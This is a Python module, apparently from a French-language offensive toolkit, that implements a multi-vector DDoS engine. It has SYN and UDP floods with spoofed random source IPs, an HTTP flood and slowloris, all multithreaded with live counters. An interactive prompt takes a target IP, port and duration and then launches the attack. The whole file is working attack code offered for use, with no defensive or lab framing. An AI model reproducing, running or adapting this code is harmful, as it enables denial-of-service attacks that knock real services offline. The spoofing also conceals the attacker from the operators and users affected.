# -*- coding: utf-8 -*-
# Module 15 : DDoS multi-vecteurs + stats live
import socket, random, threading, time, json, os
from datetime import datetime

try:
    from scapy.all import IP, TCP, UDP, Raw, send
except ImportError:
    send = None

class DDoSEngine:
    def __init__(self, target, port, method, threads, duration):
        self.target = target
        self.port = port
        self.method = method
        self.threads = threads
        self.duration = duration
        self.stop_flag = False
        self.stats = {"sent":0,"errors":0,"start":None,"end":None}
        self.lock = threading.Lock()

    def rand_ip(self):
        return ".".join(str(random.randint(1,254)) for _ in range(4))

    def _inc(self, key):
        with self.lock:
            self.stats[key] += 1

    def syn_flood(self):
        while not self.stop_flag:
            try:
                ip = IP(src=self.rand_ip(), dst=self.target)
                tcp = TCP(sport=random.randint(1024,65535), dport=self.port,
                          flags="S", seq=random.randint(0,2**32-1))
                send(ip/tcp, verbose=0)
                self._inc("sent")
            except Exception:
                self._inc("errors")

    def udp_flood(self):
        payload = b"X" * 1024
        while not self.stop_flag:
            try:
                ip = IP(src=self.rand_ip(), dst=self.target)
                udp = UDP(sport=random.randint(1024,65535), dport=self.port) / Raw(payload)
                send(ip/udp, verbose=0)
                self._inc("sent")
            except Exception:
                self._inc("errors")

    def http_flood(self):
        import urllib.request
        while not self.stop_flag:
            try:
                req = urllib.request.Request(
                    f"http://{self.target}:{self.port}/",
                    headers={"User-Agent":f"Mozilla/5.0 {random.randint(0,9999)}"})
                urllib.request.urlopen(req, timeout=2).read()
                self._inc("sent")
            except Exception:
                self._inc("errors")

    def slowloris(self):
        socks = []
        while not self.stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n")
                socks.append(s)
                self._inc("sent")
            except Exception:
                self._inc("errors")
            time.sleep(5)

    def worker(self):
        m = getattr(self, self.method, self.http_flood)
        m()

    def monitor(self):
        while not self.stop_flag:
            time.sleep(2)
            with self.lock:
                print(f"\r  \033[33mEnvoyés: {self.stats['sent']} | Erreurs: {self.stats['errors']}\033[0m", end="", flush=True)

    def run(self):
        self.stats["start"] = datetime.now().isoformat()
        threads = [threading.Thread(target=self.worker, daemon=True)
                   for _ in range(self.threads)]
        for t in threads: t.start()
        mon = threading.Thread(target=self.monitor, daemon=True)
        mon.start()
        time.sleep(self.duration)
        self.stop_flag = True
        for t in threads: t.join(timeout=2)
        print()
        self.stats["end"] = datetime.now().isoformat()
        os.makedirs("output", exist_ok=True)
        with open("output/ddos_stats.json","w",encoding="utf-8") as f:
            json.dump(self.stats, f, indent=2)

def run_interactive():
    from toolkit import ok, err, info, warn, section, ask, confirm
    section("DDoS MULTI-VECTEURS")
    target = ask("IP cible")
    port = int(ask("Port","80"))
    method = ask("Méthode (syn_flood/udp_flood/http_flood/slowloris)","http_flood")
    threads = int(ask("Threads","200"))
    dur = int(ask("Durée (s)","30"))
    if not confirm(f"Confirmer DDoS {method} sur {target}:{port} pendant {dur}s ?"):
        return
    engine = DDoSEngine(target, port, method, threads, dur)
    info("Attaque en cours... Ctrl+C pour stopper")
    try:
        engine.run()
    except KeyboardInterrupt:
        engine.stop_flag = True
    ok(f"Envoyés : {engine.stats['sent']} | Erreurs : {engine.stats['errors']}")
    ok("Rapport : output/ddos_stats.json")